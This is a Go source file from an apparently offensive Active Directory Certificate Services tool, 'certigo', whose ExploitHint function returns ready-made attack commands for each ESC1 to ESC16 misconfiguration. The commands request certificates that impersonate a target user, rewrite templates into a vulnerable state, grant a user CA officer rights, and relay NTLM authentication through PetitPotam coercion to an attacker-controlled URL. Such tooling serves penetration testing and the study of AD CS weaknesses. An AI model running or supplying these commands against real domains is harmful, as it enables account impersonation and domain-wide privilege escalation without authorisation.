package esc

import (
	"fmt"
	"strings"

	"github.com/ajm4n/certigo/internal/adcs"
)

// ExploitHint returns a single-line (or multi-line, newline-terminated)
// command string suggesting how to abuse the finding. The returned string
// is empty when no hint is available for the ESC kind.
//
// Values in angle brackets (<target-upn>, <ca-host>, etc.) are placeholders
// the operator must substitute. The hints mirror what Certipy's README and
// the SpecterOps "Certified Pre-Owned" paper recommend.
func ExploitHint(f adcs.Finding, tpl *adcs.Template, ca *adcs.CertificateAuthority) string {
	tplName := ""
	if tpl != nil {
		tplName = tpl.Name
		if tplName == "" {
			tplName = tpl.DisplayName
		}
	}
	caName := "<ca-name>"
	caHost := "<ca-host>"
	if ca != nil {
		if ca.Name != "" {
			caName = ca.Name
		}
		if ca.DNSName != "" {
			caHost = ca.DNSName
		}
	}

	switch f.ESC {
	case "ESC1":
		return fmt.Sprintf(
			"certigo req --ca %s --ca-name %s --template %s \\\n"+
				"            -u <user> -p <pass> --upn <target-upn>@<domain> --out victim.pfx\n"+
				"certigo auth --pfx victim.pfx -u <target> -d <domain> --dc-host <dc-host> \\\n"+
				"            --out-ccache victim.ccache",
			caHost, caName, tplName,
		)

	case "ESC2":
		return fmt.Sprintf(
			"# ESC2: Any-Purpose EKU lets you sign anything. Request, then misuse.\n"+
				"certigo req --ca %s --ca-name %s --template %s \\\n"+
				"            -u <user> -p <pass> --out loot.pfx",
			caHost, caName, tplName,
		)

	case "ESC3":
		return fmt.Sprintf(
			"# ESC3: use an Enrollment Agent cert to request on behalf of another user.\n"+
				"certigo req --ca %s --ca-name %s --template %s \\\n"+
				"            -u <user> -p <pass> --out agent.pfx\n"+
				"# Then enroll-for:\n"+
				"certipy req --ca %s --template User --pfx agent.pfx --on-behalf-of <domain>\\\\<target>",
			caHost, caName, tplName, caHost,
		)

	case "ESC4":
		return fmt.Sprintf(
			"# ESC4: backup + make template vulnerable, then exploit as ESC1.\n"+
				"certigo template -u <user> -p <pass> -d <domain> --dc-host <dc-host> \\\n"+
				"            --name %s --action make-vulnerable --file %s.backup.json\n"+
				"# then the ESC1 flow with the same --template %s",
			tplName, tplName, tplName,
		)

	case "ESC5":
		return "# ESC5: writable PKI container. Enumerate with `certigo ca --list-officers`.\n" +
			"# Exact exploitation depends on which object is misconfigured."

	case "ESC6":
		return fmt.Sprintf(
			"# ESC6: CA sets EDITF_ATTRIBUTESUBJECTALTNAME2 - any template accepts SAN.\n"+
				"certigo req --ca %s --ca-name %s --template User \\\n"+
				"            -u <user> -p <pass> --upn <target-upn>@<domain> --out victim.pfx",
			caHost, caName,
		)

	case "ESC7":
		return fmt.Sprintf(
			"# ESC7: you hold Manage-CA. Toggle officer / approve a pending cert.\n"+
				"certigo ca --ca-name %s -u <user> -p <pass> -d <domain> --dc-host <dc-host> \\\n"+
				"            --list-officers\n"+
				"certigo ca --ca-name %s -u <user> -p <pass> -d <domain> --dc-host <dc-host> \\\n"+
				"            --add-officer <your-sid>\n"+
				"certigo ca --ca-name %s -u <user> -p <pass> -d <domain> --dc-host <dc-host> \\\n"+
				"            --issue-request <pending-request-id>",
			caName, caName, caName,
		)

	case "ESC8":
		return fmt.Sprintf(
			"# ESC8: web enrollment + NTLM relay.\n"+
				"certigo relay --listen :80 --target http://%s/certsrv/ \\\n"+
				"            --trigger petitpotam --target-host <victim> \\\n"+
				"            --attacker-url http://<attacker>/ --out-dir loot",
			caHost,
		)

	case "ESC9":
		return "# ESC9: template has CT_FLAG_NO_SECURITY_EXTENSION. Weak mapping vuln.\n" +
			"# Request the cert like ESC1, then feed it through a weak altSecurityIdentities\n" +
			"# mapping on the DC. Detection signal only - exploitation depends on DC config."

	case "ESC10":
		return "# ESC10: weak certificate binding (StrongCertificateBindingEnforcement).\n" +
			"# Use any weak-mapped cert (no SID in NTDS-CA-Security-Ext) for UPN spoofing."

	case "ESC11":
		return fmt.Sprintf(
			"# ESC11: CA does not require IF_ENFORCEENCRYPTICERTREQUEST.\n"+
				"# Relay NTLM to ICPR RPC like ESC8.\n"+
				"certigo relay --listen :80 --target rpc://%s \\\n"+
				"            --trigger petitpotam --target-host <victim> \\\n"+
				"            --attacker-url http://<attacker>/ --out-dir loot",
			caHost,
		)

	case "ESC13", "ESC16":
		return fmt.Sprintf(
			"# %s: template issuance / application policy maps to a privileged group.\n"+
				"# Enrol the template - the CA injects the privileged-group SID into the cert.\n"+
				"certigo req --ca %s --ca-name %s --template %s \\\n"+
				"            -u <user> -p <pass> --out escalated.pfx",
			f.ESC, caHost, caName, tplName,
		)

	case "ESC14":
		return "# ESC14: altSecurityIdentities writable on target principal. Write your\n" +
			"# cert's SAN mapping into the DC and auth with it."

	case "ESC15":
		return "# ESC15: weak Schannel cert mapping. Request a cert with --upn pointing\n" +
			"# at a target, auth via LDAPS Schannel."
	}
	return ""
}

// IndentBlock prefixes every line of s with `indent`. Useful for rendering
// multi-line hints under a bullet in the text formatter.
func IndentBlock(s, indent string) string {
	if s == "" {
		return ""
	}
	lines := strings.Split(s, "\n")
	for i, l := range lines {
		lines[i] = indent + l
	}
	return strings.Join(lines, "\n")
}
